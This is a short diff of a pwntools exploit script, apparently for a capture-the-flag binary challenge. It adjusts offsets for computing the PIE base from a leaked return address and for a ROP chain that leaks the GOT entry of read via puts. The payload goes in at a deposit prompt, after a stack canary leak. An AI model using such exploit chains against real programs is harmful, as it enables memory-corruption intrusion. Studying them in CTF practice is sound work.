@@ -31,7 +31,7 @@ def main():
     saved_rip = u64(leak[88:96])
     
     # Calc PIE base
-    exe.address = saved_rip - 0x18b6
+    exe.address = saved_rip - 0x1982
     
     log.success(f"Canary: {hex(canary)}")
     log.success(f"PIE: {hex(exe.address)}")
@@ -59,7 +59,7 @@ def main():
     payload += p64(exe.got['read'])
     payload += p64(exe.plt['puts'])
 
-    payload += p64(exe.address + 0x1448)
+    payload += p64(exe.address + 0x1468)
 
     r.sendlineafter(b"Amount to deposit: ", payload)
 
